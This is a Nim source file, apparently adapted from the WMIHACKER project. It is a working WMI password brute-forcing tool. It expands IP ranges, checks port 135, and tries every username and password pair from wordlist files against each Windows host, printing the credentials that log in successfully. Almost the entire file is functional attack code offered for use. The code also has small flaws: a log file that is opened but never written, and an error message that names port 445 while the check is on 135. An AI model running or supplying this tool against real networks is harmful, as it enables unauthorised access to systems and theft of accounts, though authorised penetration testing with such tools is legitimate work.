#https://github.com/360-Linton-Lab/WMIHACKER
import winim/com
import nimpy
import os
import strutils
import strformat
import terminal
import net

let logFilename = "wmiLogin.log"
var logFile: File
logFile = open(logFilename, fmAppend)

type
    STATUS* = enum
        Error, Success, Info

proc printC(stat: STATUS, text: string) = 
    case stat
    of Error:
        stdout.styledWrite(fgRed, "[-] ")
    of Success:
        stdout.styledWrite(fgGreen, "[+] ")
    of Info:
        stdout.styledWrite(fgYellow, "[*] ")
    echo text
    
proc telnet(host: string): bool =
    var socket = newSocket()
    try:
        socket.connect(host, Port(135), timeout=2000)
        return true
    except:
        printC Error, fmt"{host}:445 close smb"
        return false
    finally:
        socket.close()    
        
proc ipParser(somestr: string): seq[string] =
    var ipaddress = pyImport("ipaddress")
    var nodes: seq[string]
    if fileExists(somestr):
        for line in somestr.lines:
            nodes.add(line)
    else:
        nodes.add(somestr.split(','))

    for node in nodes:
        try:
            let net4 = ipaddress.ip_network(node, strict=false)            
            if net4.num_addresses.to(int) > 1:
                for x in net4.hosts():
                    result.add($x)
            else:
                let ip = ipaddress.ip_address(node)
                result.add($ip)
        except:
            #somestr does not appear to be an IPv4 or IPv6 network
            #echo getCurrentExceptionMsg()
            discard        

proc wmiLogin(host, user, pass: string) =
    var objLocator = CreateObject("wbemscripting.swbemlocator")
    try:
        var SubobjSWbemServices = objLocator.connectServer(host, "root\\cimv2", user, pass)
        discard SubobjSWbemServices.InstancesOf("Win32_Service")
        printC Success, fmt"{host} - '{user}':'{pass}' Successfully logged on!"
    except:
        #echo getCurrentExceptionMsg()
        printC Error, fmt"{host} - '{user}':'{pass}' Login failed"


proc main() =
    if  paramCount() == 0 or paramStr(1) in ["-h","/?","help"]:
        let pathSplit = splitPath(paramStr(0))
        echo "Usage: ", pathSplit.tail, " 192.168.1.111" 
        echo "Usage: ", pathSplit.tail, " 10.10.10.0/24" 
        echo "Usage: ", pathSplit.tail, " ip.txt"
        quit()
    
    let hosts = ipParser(paramStr(1))
    
    if fileExists("userpass.txt"):
        var credential: tuple[user, pass: string]
        var userpass: seq[tuple[user, pass: string]]
        try:
            for line in "userpass.txt".lines:
                let t = split(line, " ", 1)
                credential.user = t[0]
                credential.pass = t[1]
                userpass.add(credential)
        except:
            echo getCurrentExceptionMsg()
            quit()
            
        for host in hosts:
            if telnet(host):
                for credential in userpass:
                    wmiLogin(host, credential.user, credential.pass)
        
    elif fileExists("user.txt") and fileExists("pass.txt"):
        var users: seq[string]
        var passes: seq[string]
        for line in "user.txt".lines:
            users.add(line)
        for line in "pass.txt".lines:
            passes.add(line)
        
        for host in hosts:
            if telnet(host):
                for user in users:
                    for pass in passes:
                        wmiLogin(host, user, pass)
    else:
        echo "userpass.txt not found"
        echo "user.txt or pass.txt not found"
        quit()        
    
    logFile.close()


when isMainModule:
    when defined windows:
        main()